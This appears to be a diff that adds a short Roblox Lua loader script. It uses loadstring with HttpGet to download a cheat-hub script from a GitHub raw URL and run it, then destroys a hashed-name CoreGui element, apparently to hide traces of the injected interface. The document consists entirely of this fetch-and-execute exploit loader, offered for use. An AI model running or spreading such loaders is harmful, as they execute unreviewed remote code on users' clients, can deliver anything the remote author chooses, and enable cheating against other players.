@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/Zlhub/refs/heads/main/ZLPVPreview.lua"))()
+task.wait(0.5)
+local a=game:GetService("CoreGui"):FindFirstChild("863a1a078965f11faa3c0cdd735c718806a9ae25ed076f39a43aeea533a69e4c")if a then a:Destroy()end
